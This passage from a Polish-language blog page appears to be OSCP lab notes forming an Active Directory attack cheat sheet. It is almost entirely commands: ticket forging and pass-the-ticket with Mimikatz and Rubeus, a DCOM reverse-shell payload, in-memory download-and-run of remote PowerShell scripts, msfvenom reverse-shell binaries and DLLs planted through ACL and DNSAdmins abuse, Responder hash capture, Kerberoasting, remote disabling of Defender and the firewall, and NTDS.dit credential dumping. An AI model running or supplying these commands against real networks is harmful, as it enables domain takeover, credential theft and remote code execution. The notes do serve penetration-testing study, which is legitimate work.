[0;145fb4]-0-0-40810000-dave@cifs-web04.kirbi<br>#&gt; <mark style="background-color:#caffbe" class="has-inline-color">kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi  </mark>(dostajemy odp:OK)<br>#&gt; klist  (powinien byc bilet dave)<br>#&gt; teraz to polecenie zadziała: ls \\web04\backup</p>



<h5 class="wp-block-heading"><span class="ez-toc-section" id="%E2%80%93Wykorzystanie_Ticketu" ez-toc-data-id="#–Wykorzystanie_Ticketu"></span>–Wykorzystanie Ticketu<span class="ez-toc-section-end"></span></h5>



<p><strong>###Mimikatz###</strong><br>#kerberos::ptt Kirbi-plik-nazwa<br><strong>###Ruberus###</strong><br>#Rubeus.exe ptt /ticket:Kirbi-plik-nazwa<br><strong>###Inne###</strong><br>#PsExec.exe -accepteula \ \$IP cmd<br>#dir \\DC01\\c$<br>#Invoke-Command -ComputerName DC01 -ScriptBlock(whoami)<br>#Enter-PSSession -ComputerName DC01<br></p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="DCOM" ez-toc-data-id="#DCOM"></span>DCOM<span class="ez-toc-section-end"></span></h4>



<p><em>model obiektów rozproszonych komponentów (DCOM)</em></p>



<p>#w Powershell:<br>#&gt; $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(„MMC20.Application.1″,”192.168.201.73”))   (IP innej maszyny ktora jest celem)<br>#&gt; $dcom.Document.ActiveView.ExecuteShellCommand(„cmd”,$null,”/c calc”,”7″)<br>#ps. co ciekawe w w/w zamiast Command możemy użyć: Directory, Parameters, and WindowState.<br>#wykorzystamy payload rev-shell z encode.py (podmienimy tylko IP i port na Kalim)</p>



<pre class="wp-block-code"><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<strong>192.168.201.73</strong>")) 

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <strong>PAYLOAD_BASE64</strong>","7")</code></pre>



<p>#&gt; i mamy rev-shella na Kalim (nasluch nc) z maszyny 73</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Token_Impersonation" ez-toc-data-id="#Token_Impersonation"></span>Token Impersonation<span class="ez-toc-section-end"></span></h4>



<p>#GetSystem.ps1<br>#IEX (IWR -usebasicparsing https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/privesc/Get-System.ps1);Get-System (po uruchomieniu sprawdz whoami, powinieneś być \SYSTEM)<br><strong>###PowerEmpire###</strong><br>#usemodule/powershell/privesc/getsystem <br><strong>###Metasploit###</strong><br>#load incognito (Load token module)<br>#list_tokens -u (List available tokens)<br>#impersonate_token $Full_name_of_token np. impersonate_token 'NT AUTHORITY\SYSTEM’\\system<br>#rev2self (Revert to original token (Meterpreter))<br><strong>###<a href="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1">SharpImpersonation</a> (Invoke)###</strong><br>#IEX (IWR -usebasicparsing https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpImpersonation.ps1) (do pamięci)<br>#Invoke-SharpImpersonation -Command „list” (List current tokens on system)<br>#Invoke-SharpImpersonation -Command „user:corp\offsec” (próba podszycia się pod usera z pierwszym znaleziony procesem)<br>#Invoke-SharpImpersonation -Command „user:corp\offsec binary:cmd.exe”<br><strong>###Create Process with Token###</strong><br>#iex(iwr -usebasicparsing „https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1”);Get-WinLogonTokenSystem<br><strong>###PowerEmpire###</strong><br>#usemodule/powershell/management/runas<br><strong>###Runas###</strong><br>#Runas /user:corp\offsec powershell.exe<br>#jak się uda to dodaj usera: net user /add /domain NewAdmin Password123   #&gt;  net localgroup „Domain Admins” /domain /add NewAdmin</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="ACL" ez-toc-data-id="#ACL"></span>ACL:<span class="ez-toc-section-end"></span></h4>



<p>LISTA KONTROLI DOSTEPU. <em>GenericAll – full permision ; GenericWrite – Edit atributes ; WriteOwner – change ownership of object ; WriteDACL – edit ACE’s applied to object ; AllExtededRights – change password, reset password ; ForceChangePassword – password change for object ; Self – add ourselves to for example to group</em></p>



<p><strong>###PowerView###</strong><br>#Get-ObjectAcl -Identity stephanie (login wlasnego usera)<br>#<mark style="background-color:#c0ffb2" class="has-inline-color">Get-ObjectAcl -Identity „Management Department” | ? {$_.ActiveDirectoryRights -eq „GenericAll”} | select SecurityIdentifier,ActiveDirectoryRights</mark>  (kto ma prawo GenericAll do Managment Department, napewno bedzie Domain Admins itd. ale może nasz user bedzie mieć!)<br>#&gt; net group „Management Department” stephanie /add /domain (jeżeli powyższe to mozemy dodać naszego usera do tej grupy)<br>#&gt; Get-NetGroup „Management Department” | select member (sprawdzamy czy dodalo)<br>#–<br>#<mark style="background-color:#bcf9af" class="has-inline-color">Get-ObjectAcl -Identity „Managment Department” | ? {$_.ActiveDirectoryRights -eq „GenericAll”}</mark> (oscp23, możesz zamiast nazwy grupy dać nazwe usera też, ale to chyba kto ma prawa do grupy Managment … a nie do czego ona ma prawo)<br>#Get-ObjectAcl -Identity „Managment Department” | ? {$_.ActiveDirectoryRights -eq „GenericAll”} |select SecurityIdentifier,ActiveDirectoryRights (pokaże SID właściciela)<br>#”SIS1″,”SID2″,”SID3″ | Convert-SidToName (zamienia SID właścicieli na nazwe)<br>#<mark style="background-color:#9eff88" class="has-inline-color">Convert-SidToName „SID-1”, „SID-2”</mark><br>#Invoke-ACLScanner -ResolveGUIDs<br>#Get-ObjectAcl -SamAccountName offsec (czyli na co Allow; powinno też działać z przełącznikiem -ResolveGUIDs ale u mnie nie działa)<br>#<strong>Get-ObjectAcl -SamAccountName „Domain admins”</strong><br>#jeżeli masz jakieś ACl do grupy Domain Admins to dodaj siebie : Add-DomainGroupMember -Identity 'Domain Admins’ -Members 'offsec’ -Domain 'corp’<br>#get-objectacl -samaccountname sql_service<br>#get-objectacl -samaccountname sql_service | ? { ($_.ActiveDirectoryRights -match 'GenericWrite’)} (możesz też dać * aby sprawdzić dla wszystkiego)<br>#Zestawienie <a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">poleceń</a><br>#Get-ObjectAcl -SamAccountName „DNSAdmins” | ? {($_.ActiveDirectoryRights -match 'GenericAll’)}<br>#Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name} (pokaż ciekawe ACL dla mojego usera)<br><strong>###Moje prawa do innych sprawdzanie###</strong><br>#<mark style="background-color:#c8ffbc" class="has-inline-color">Get-NetUser MOJANAZWA</mark>  (i zapisz swój SID)<br>#<mark style="background-color:#c1ffb3" class="has-inline-color">Get-ObjectAcl -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericWrite’) -and ($_.SecurityIdentifier -match 'TWOJ-SID’)}</mark><br><strong>###Jeżeli masz do kogoś GenericWrite###</strong><br>#msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=$WIN1 LPORT=4444 -d exe &gt; privesc.exe<br>#&gt;zrób na WIN1 folder /priv z maksymalnym udostępnieniem sharing i security i wrzuć tu privesc.exe<br>#&gt;Set-DomainObject -Identity jeff_admin -Set @{’scriptpath’=’\student\priv\privesc.exe’}<br>#&gt; sprawdź czy dodało: Get-DomainUser -Identity jeff_admin -Properties scriptpath<br>#&gt; włącz nasłuchowanie i czekaj: powercat -l -p 4444 -Verbose</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Session_Hijack" ez-toc-data-id="#Session_Hijack"></span>Session Hijack<span class="ez-toc-section-end"></span></h4>



<p><a href="https://3haker.pl/udemy-kurs-active-directory/">lab</a> z udemy AD</p>



<p>#PsExec.exe -s \localhost cmd (jako local admin, ale mi to działało tylko jako admin elevated wiec nie wiem po co)<br>#&gt;query user<br>#&gt;sc create sesshijack binpath= „cmd.exe /k tscon 3 /dest:rdp-tcp#3” (w.w: tscon 3: bo admin ma ID 3, a rdp-tcp#3 bo z tego korzysta zwykły user)<br>#&gt; net start sesshijack</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="SMB_Relay_Attack" ez-toc-data-id="#SMB_Relay_Attack"></span>SMB Relay Attack<span class="ez-toc-section-end"></span></h4>



<p>jak ktoś w domenie poda złą ścieżke do plików</p>



<p><strong>###Inveigh.ps1###</strong><br>#Import-module .\Inveigh.ps1<br>#&gt; Invoke-Inveigh -Inspect (chyba w czasie rzeczywistum powinno pokazywać sesej)<br>#Clear-Inveigh – clear the $inveigh hashtable<br>#<strong>Get-Inveigh</strong> – get data from the $inveigh hashtable (tak to sciaga hashe!!)<br>#Stop-Inveigh – stop all running Inveigh modules<br>#Watch-Inveigh – enable real time console output<br><strong>###Inveigh.exe – nie znalazłem###</strong><br>#Inveigh.exe (as Admin)<br>#najlepiej mi sie sprawdza: .\Inveigh.exe -sniffer n (nie musisz byc adminem)<br>#&gt; hashcat -m 5600 hadams.txt rockyou.txt (w testach mi zadziałało, john zawiódł kodowanie UTF-8)<br>#&gt; john –wordlist /home/kali/tools/rockyou.txt hash.txt –-format=netntlmv2<br><strong>###lab 1###</strong><br>#sudo responder -I tun0 #&gt; na Windowsie probujemy uzyskac dostęp do nieistniejącego pliku na Kalim : dir \192.168.119.2\test #&gt; w Responderze pojawia nam sie hash usera #&gt; kopiujemy hash do pliku i hashcat: hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt –force (a może nawet prościej: john hashes.txt –wordlist=/usr/share/wordlists/rockyou.txt) #&gt; mamy hasłoa wiec do RDP   LUB   evil-winrm -i $IP -u offsec -p lab<br><strong>###lab 2 by s1ren###</strong><br>#zobacz <a href="https://3haker.pl/vault-walkthrough-with-s1ren-pg-practice-hack-a-thon/">tutaj</a>, lab z dodaniem na smb pliku ikony z URL do Kaliego i zdobycie hasha</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="DNS_Admins" ez-toc-data-id="#DNS_Admins"></span>DNS Admins<span class="ez-toc-section-end"></span></h4>



<p>#<a href="https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/">artykul</a> o roznych metodach<br><strong>###PowerView###</strong><br>#Get-NetGroup „DnsAdmins” | select member<br>#Add-DomainGroupMember -Identity 'DnsAdmins’ -Members 'offsec’<br>#?? czy to tutaj .\SpoolSample.exe DC01.corp.com CLIENT251.corp.com<br><strong>###Priv Esc by Domain Admins – jeżeli jesteś członkiem###</strong><br>#msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.55 LPORT=4444 -f dll &gt; priv.dll (tu IP WIN-1)<br>#&gt; tworzy folde /priv i dzieli sie EVERYONE (sharing i security allw wszedzie) + wkleja tu plik priv.dll<br>#&gt; dnscmd dc.pentesting.local /config /serverlevelplugindll \student\priv\privsc.dll (zadziała jeżeli jest pewne funkcja w AD właczona)<br>#&gt;PS 1: powercat -l -p 4444 -Verbose<br>#&gt;PS 2: sc.exe \\DC01.corp.com stop dns #&gt; sc.exe \\DC01.corp.com start dns (ja akurat miałem na testach access denied) + powinen być reverseshell po kilku próbach stop/start<br>#ps. Adamski miał podobny lab i korzystał z <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise">tych</a> payloadów: zrobił .dll #&gt; zrobił impacket smb server i ja tam wrzucił #&gt; odwołał się do niej z Windowsa przez dnscmd … #&gt; stop i start dns</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Unconstrained_delegation" ez-toc-data-id="#Unconstrained_delegation"></span>Unconstrained delegation<span class="ez-toc-section-end"></span></h4>



<p>#xx<br><strong>###PowerView###</strong><br>#Get-NetComputer -Unconstrained | select -ExpandProperty name<br>#Get-DomainComputer -Unconstrained<br>#Get-DomainComputer -SearchBase „LDAP://OU=secret,DC=corp,DC=com” -Unconstrained<br>#Get-DomainComputer -Unconstrained | Select DnsHostName,UserAccountControl<br><strong>###Mimikatz###</strong><br>##Get all tickets<br>#privilege::debug (czy masz w ogóle uprawniania do zrzutu danych)<br>#sekurlsa::tickets<br>##Export Tickets and import them into our process<br>#sekurlsa::tickets /export<br>#kerberos::ptt %NAME OF EXPORTED TICKET%.kirbi <br>#Invoke-Mimikatz -Command '”kerberos::ptt C:\Users\appadmin\Documents\user648[0;334d6c]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbii”’ (oneliner)<br>#PsExec.exe \dc01 cmd (Use PSEXEC to test access to domain controller)<br><strong>###Rubeus###</strong><br>#lewy PS (musi być admin elevated): .\Rubeus.exe monitor /interval:1<br>#prawy PS: .\SpoolSample.exe DC01.corp.com CLIENT251.corp.com<br>#podobno alternatywa do SpollSample: copy /b FILE \\Server\PRINTQ (gdzie FILE jest lokalnym plikiem zawierającym zadanie do wydrukowania, a PRINTQ jest nazwą udostępnionej kolejki wydruku.)<br>#.\PetitPotam.exe DC01.corp.com CLIENT251.corp.com EfsRpcOpenFileRaw<br><strong>###The Printer Bug na hoscie z Unconstraid, atak na TGT relay##</strong><br>#responder -I tun0 –lm<br>#proxychains python <a href="https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc">dementor.py</a> -u xsvc -p 'S3cur3PW123′ -d 'burmat.co’ 10.10.15.123 10.10.10.123</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Constrained_Delegation" ez-toc-data-id="#Constrained_Delegation"></span>Constrained Delegation<span class="ez-toc-section-end"></span></h4>



<p>#xx<br><strong>###PowerView###</strong><br>#Get-DomainComputer -TrustedToAuth| Select DnsHostName,UserAccountControl,msds-allowedtodelegateto | FL<br>#Get-DomainUser -TrustedToAuth (Get user Constrained Delegation)<br><strong>###Rubeus###</strong><br>#Rubeus.exe s4u /ticket:%TICKETNAME% /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt<br><strong>###Kekeo###</strong><br>#Najlpierw potrzebne NTLM z Mimikatz: import-module ./Invoke-Mimikatz.ps1 #&gt; invoke-mimikatz i kopiuje NTLM maszyny student$ (oczywiście maszyna z listy: Get-DomainComputer -TrustedToAuth)<br>#kekeo.exe<br>#tgt::ask /user:student$ /domain:pentesting.local /rc4:TU-NTLM-MASZYNY<br>#&gt;Zapisze bilet TGT .kirbi na dysku i użycie w kekeo:<br>#&gt; tgs::s4u /tgt:PLIK-TGT.kirbi /user:Administrator@corp.com /service:time/DC01.corp.com|ldap/DC01.corp.com<br>#&gt; stworzy teraz plik biletu TGS<br>#&gt; Invoke-Mimikatz -Command '”kerberos::ppt PLIK-TGS.kirbi”’<br>#&gt; sprawdź czy działa: dir \\DC01\C$   ;  klist<br>#&gt; Invoke-Mimikatz -Command '”lsadump::dcsync /user:corp\krbtgt”’ (próba pobrania NTLM Hash krbtgt, możemy też dla innych userów np. jeff_admin)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="ZeroLogon_CVE-2020-1472" ez-toc-data-id="#ZeroLogon_CVE-2020-1472"></span>ZeroLogon CVE-2020-1472<span class="ez-toc-section-end"></span></h4>



<p><em>z 2020 Zerologon umożliwia nieuwierzytelnionemu atakującemu zdalną eskalację swoich uprawnień do administratora domeny</em></p>



<p><strong>###Invoke-Mimikatz###</strong><br>#Invoke-Mimikatz -Command '”lsadump::zerologon /target:DC01.corp.com /account:DC01$”’ (możesz dodać po spacji /exploit) ps. u mnie przez incoke jak i exe pokazuje że nie ma modułu zerologon ??<br>#jeżeli pojawiły się w odpowiedzi że jest podatne i wartości NEtServPAss…0x00000 to wypróbuj mimikatz: lsadump::dcsync /dc:DC01.corp.com /authuser:DC01$ /authdomain:corp.com /authpassword:”” /authntlm /user:krbtgt (jeżeli jest podatnosć powinniśmy dostać NTLM hash user:krbtgt)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="SPN" ez-toc-data-id="#SPN"></span>SPN:<span class="ez-toc-section-end"></span></h4>



<p><em>Service Principal Names</em> – konta usług, mogą miec takze wysokie uprawnienia</p>



<p>#<mark style="background-color:#d7ffce" class="has-inline-color">setspn -L iis_service</mark> (zapytanie o konkretna usluge, korzysta z setpn.exe ktory jest na kazdym Windows  ;  oscp23)<br>#PS: Get-NetUser -SPN | select samaccountname,serviceprincipalname <br><strong>###PowerView###</strong><br>#Get-DomainUser -SPN (find all users with an SPN set (likely service accounts))<br>#Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins’} (find all service accounts in „Domain Admins”)<br>#Get-NetUser -SPN | select samaccountname,serviceprincipalname  (oscp23)<br>#&gt; nslookup.exe web04.corp.com<br><strong>##Odzyskanie hasha##</strong><br>#<mark style="background-color:#ffbfd5" class="has-inline-color">Get-DomainUser | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash</mark>  (w challenges pobrao mi hashe wielu osob)<br>#Get-DomainUser -Identity &lt;User&gt; | Get-DomainSPNTicket -Format Hashcat | select -ExpandProperty Hash</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Kerberoasting" ez-toc-data-id="#Kerberoasting"></span>Kerberoasting:<span class="ez-toc-section-end"></span></h4>



<p>Jako zwykły user! <em>Celem jest zdobycie poświadczeń konto serwisowych i uzyskanie dostępów do nowych zasobów w domenie. Korzysta ze słownika znanych wartości nazw SPN.</em><br>Potężne konto „krbtgt” hasło zawsze takie samo.</p>



<p><strong>###Invoke-Kerberoast###</strong><br>#import-module .\Invoke-Kerberoast.ps1<br>#&gt; invoke-kerberoast (pewnie nic nie pokaże)<br>#&gt; import-module PoweView.ps1<br>#&gt; Get-ObjectAcl -SamAccountName * | ?{($_.ActiveDirectoryRights -match „GenericWrite”) -and ($_.SecurityIdentifier -match 'SID-USERA’)}<br>#&gt; jak będzie na liście wyników jakiś obiekt np. osoba to dopisz jej: Set-DomainObject -Identity jeff_admin -Set @{’serviceprincipalname’=’ops/whatever1’}<br>#&gt; invoke-kerberoast (teraz powinno dac ticket i kopiujemy go od pliku: hash.txt)<br>#&gt; invoke-kerberoast -OutputFormat Hashcat &gt; hash.txt<br>#&gt; hashcat -m 13100 hash.txt rockyou.txt (jak masz hasło to zaloguj się Remote na konto usera)<br><strong>###Mimikatz###</strong><br>#kerberos::list /export (pobiera bilety serwisowe do pliku)<br><strong>###PowerView###</strong><br>#Get-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountName<br>#Get-DomainUser -SPN | select Name,SrvicepPincipalnNme (Get kerberoastable users)<br><strong>###Impacket GetUserSPNs.py###</strong><br>#GetUserSPNs.py corp/offsec: -dc-ip $IP -request<br><strong>###Empire###</strong><br>#powershell/credentials/invoke_kerberoast<br><strong>##Metasploit###</strong><br>#use auxiliary/gather/get_user_spns<br><strong>###PowerSploit###</strong><br>#iex (iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1); Invoke-Kerberoast | FL<br><strong>###Rubeus###</strong><br>#Rubeus kerberoast /nowrap /simple (Kerberoast all users in Domain)<br>#Rubeus.exe kerberoast /ou:OU=Service_Accounts,DC=Security,DC=local /nowrap /simple (All Users in OU)<br><strong><mark style="background-color:#fbb9ff" class="has-inline-color">###oscp23###</mark></strong><br>#czyli szukamy hasla do uslug np.iis_service<br>#<mark style="background-color:#c6ffb9" class="has-inline-color">.\Rubeus.exe kerberoast /outfile:hashes.kerberoast</mark><br>#&gt; zapisał w pliku, skopiuj hash do Kaliego<br>#&gt; sudo hashcat -m 13100 kerber.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br>#—Impacket<br>#<mark style="background-color:#a5ff91" class="has-inline-color">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</mark>  (jezeli error Clock … to musimy synchronizowac zegar Kali z Windows: ntpdate3 or rdate4 t)   #&gt;   sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule –force<br><strong>###by Adamski###</strong><br>#GetNPUsers.py medtech.com/ -no-pass -usersfile users.txt (zapytania do portu 88)<br>#ps. ja u siebie nie dodawalem domeny do hosts wiec musialem okreslic IP DC: GetNPUsers.py medtech.com/ -dc-ip 172.168.216.10 -no-pass -usersfile users_domain<br>#&gt; daje mu hash $krbt$….$smith@medtech.com…. – kopiuje cały<br>#&gt; john hash.txt –wordlist=…rockyou.txt (daje mu hasło)<br>#mając hasło sprawdza czy na usera znajdzie chyba jakieś tickety: GetUserSPNs.py -request -dc-ip $IP-DC medtech.com/joe (pozniej wymaga hasla) <br>#nic nie dalo wiec laczy się evil-winrm na konto usera, znalazł na maszynie credsy innego usera i robi zrzut hashy z DC: secretsdump.py 'username:password@IP-DC’<br># bez creds!!! Adamski wyszlo:  GetNPUsers.py medtech.com/ -usersfile users.txt -dc-ip 10.10.1.50  (zeebralo mu bilet krbtg i john pozyskal haslo)<br><strong>###by S1REN###</strong><br>#Rubeus.exe kerberoast /nowrap<br>#user mial serviceprincipalname (sprawdzone przez: net user $nazwa-usera ) wieć wygenerowało Hash : $krbt…nazwa-usera#domena…hash…<br>#zapisuje hash do pliku i john z rockyou bez zadnych formatów<br><strong>###Golden Ticket###</strong><br><em>Torzysz własny zloty bilet (nawet dla nieistniejącego usera). Uzyskasz niezauważalny dostęp do wszystkich zasobów domeny</em>. Atak Golden Ticket polega na pobraniu informacji na temat konta „krbtgt”.<br>Golden Ticket potrzebuje takie dane jak: <a href="https://kapitanhack.pl/2018/09/06/killchain/rozpoznanie-w-srodowisku-active-directory-poprzez-protokol-ldap/">pełna nazwa domeny, SID domeny </a>oraz hash NTLM konta krbtgt. Musisz mieć uprawniania pozwalające na logowanie się do Kontrolera Domeny.<br>#ekstracja danych z pliku: ntds.dit<br><strong>###PowerView chyba na DC###</strong><br>#Get-DomainUser -SamAccountName -Administrator (potrzebujemy jego SID)<br>#$sess = New-PSSession -ComputerName DC01.corp.com<br>#&gt; Invoke-Command -ScriptBlock{Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess<br>#&gt; Invoke-Command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess<br>#&gt; Invoke-Command -ScriptBlock{netsh advfirewall set allprofiles state off} -Session $sess<br>#&gt; Enter-PSSession $sess (i jesteśmy administratorem na DC01)<br>#&gt;bypass AMSI: SET-ItEm……<br>#&gt;Invoke-Mimikatz -Command '”lsadump::lsa /patch”’ (interesuje nasz NTLM krbtgt)<br>#alternatywnie do w/w: Invoke-Mimikatz -Command '”lsadump::dcsync /user:corp\krbtgt”’<br>#&gt; klist<br><strong>###Mimikatz###</strong><br>#mimikatz.exe<br>#mimikatz # privilege::debug<br>#mimikatz # lsadump::lsa /inject /name:krbtgt<br>#mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500<br>#mimikatz # misc::cmd<br>#klist<br>#dir \$IP\admin$<br>—<br>#Mimikatz: Privilege::debug #&gt; lsadump::lsa /inject /name:krbtgt #&gt; kerberos::golden /User:Administrator /domain:vuln.local /sid:S-1-5-21-2356823372-3609795904-2142328116 /krbtgt:ab20acb811769e025aba7d4fef487b96 /id:500 /ptt<br><strong>###Empire###</strong><br>powershell/credentials/mimikatz/golden_ticket<br><strong>###Hasła###</strong><br>#hashcat -m 13100 -a 3 Hashes.txt rockyou.txt<br>#hashcat -m 13100 –force Hashes.txt rockyou.txt<br>#john –wordlist rockyou.txt Hashes.txt –format=krb5tgs<br><strong>###PowerShell###</strong></p>



<pre class="wp-block-code"><code>Function GetSPN{
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
$search.filter = "(servicePrincipalName=*)"
$results = $search.Findall()
foreach( $result in $results ) {
	$userEntry = $result.GetDirectoryEntry()
	Write-host "Object Name	=	"	$userEntry.name -backgroundcolor "yellow" -foregroundcolor "black"
	Write-host "DN	=	"	$userEntry.distinguishedName
	Write-host "Object Cat.	=	" $userEntry.objectCategory
	Write-host "servicePrincipalNames"
	$i=1
	foreach( $SPN in $userEntry.servicePrincipalName ) {
		Write-host "SPN ${i} =$SPN"
		$i+=1}Write-host ''}}GetSPN</code></pre>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Silver_Ticket" ez-toc-data-id="#Silver_Ticket"></span>Silver Ticket<span class="ez-toc-section-end"></span></h4>



<p><em>Fałszowanie własnych biletów serwisowych</em> <em>aby miały dostęp do wybranej jednej usługi.</em></p>



<p>#mimikatz # kerberos::golden /domain:corp.com/sid:$SID (ale bez RIF, czyli bez 4 osttanich cyfr usera) /rc4:$NTLM-HASH /user:offsec /service:$SERIW /target:$IP (Generate TGS with NTLM)<br>#mimikatz # kerberos::ptt Kirbi-plik-nazwa (Inject TGS with Mimikatz)<br>#Rubeus.exe ptt /ticket:Kirbi-plik-nazwa<br>#PsExec.exe -accepteula \\$IP cmd<br><strong><mark style="background-color:#ffc3fc" class="has-inline-color">###oscp23###</mark></strong><br>#najpierw sprawdzamy czy nasz user ma doste do uslug HTTP ana IIS: iwr -UseDefaultCredentials http://web04 (w wyniku bedzie Unauthorized)<br>#jeżeli jesteś adminem (Powershell jako admin) maszyny to uruchom mimikatz i pobierz NTL uslugi IIS: privilege::debug #&gt; <mark style="background-color:#cfffc4" class="has-inline-color">sekurlsa::logonpasswords</mark>   #&gt; kopiujemy NTLM dla user name: iis_service<br>#musimy Pobrac SID domeny, dlatego: whoami /user, kopiujemy bez 4 ostatnich cyfr na koncu czyli bez RIF<br>#pełne polecenie w mimikatz: <mark style="background-color:#cfffc4" class="has-inline-color">kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http </mark><mark style="background-color:#cdffc2" class="has-inline-color">/rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin</mark> („web04.corp.com /service:http” to cała nazwa usługi SPN ; podalism innego usera bo tak mozna)<br>#&gt; bilet załadowany do pamieci  #&gt;  mimikatz: exit  #&gt; klist<br>#weryfikacja: iwr -UseDefaultCredentials http://web04<br>#Przeglądanie strony do ktorej mamy dostęp dzięki w/w: $WebResponse = Invoke-WebRequest -usedefaultcredentials -Uri http://web04  #&gt;  $WebResponse.Content  (wiecej polecen <a href="https://4sysops.com/archives/powershell-invoke-webrequest-parse-and-scrape-a-web-page/">tutaj</a>)</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Golden_Ticket" ez-toc-data-id="#Golden_Ticket"></span>Golden Ticket:<span class="ez-toc-section-end"></span></h4>



<p><em>Persistance!</em></p>



<p><strong><mark style="background-color:#ffc4fa" class="has-inline-color">###oscp 23###</mark></strong><br>#musimy zdobyć skrót hasła krbtgt aby generować swoje bilety<br>#Silver ticket tylko fałszuje bilety do konkretnej usługi a Golden do zasobów całej domeny<br>#próbujemy przez PsExec polaczyc się z DC: PsExec64.exe \\DC1 cmd.exe  (mamy Access Denied)<br>#&gt; logujemy sie przez nowe RDP do DC1 jako jeffadmin<br>#&gt; na DC1: mimikatz #&gt; privilege::debug  #&gt; lsadump::lsa /patch  #&gt; kopiujemy NTLM dla krbtgt<br>#wracamy domaszyny 74 i czyścimy bilety: kerberos::purge<br>#kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt   (SID domeny mozesz z whoami /all bez osttatnich RID ; NTLM krbgtg)<br>#&gt; now wiersz poleceń: misc::cmd<br>#&gt; teraz zadziala: PsExec.exe \\dc1 cmd.exe   (i mamy CMD w DC1)  UWAGA to dziala tylko z nazwa hosta ale nie z IP, bo z IP to NTLM uzyje</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Shadow_Copies" ez-toc-data-id="#Shadow_Copies"></span>Shadow Copies<span class="ez-toc-section-end"></span></h4>



<p><em>Persistance! Tl to kopia w tle.</em> celem jest zrobinie kopii pliku NTDS.dit</p>



<p>#musimy polaczyc si z Kontrolerem DC1<br>#&gt;uruchom powershell jako elevated!<br>#vshadow.exe -nw -p C:  (wylacza jakis pisarzy i okresla lokalizacje do zapisu  ;   szukaj GLOBAL…)<br>#&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak  (zadzialalo mi to w CMD ale nie w Powershell)<br>#&gt; reg.exe save hklm\system c:\system.bak<br>#&gt; przenieś te 2 pliki .bak na Kaliego (mi wyszło FTP)  +  zmien uprawniania do plików: sudo chmod 755 system.bak<br>#&gt; impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL<br>#mamy NTLM wszystkich user i krbtgt (NTLM to na koncu za : i przed :::)<br>#na szybko łamanie: john –wordlist=/usr/share/wordlists/rockyou.txt all.hash –format=NT<br>#&gt; hase najlepiej wykorzystac do PTH</p>



<h4 class="wp-block-heading"><span class="ez-toc-section" id="Pre-authentication_not_required_ASREPRoast" ez-toc-data-id="#Pre-authentication_not_required_ASREPRoast"></span>Pre-authentication not required / ASREPRoast<span class="ez-toc-section-end"></span></h4>



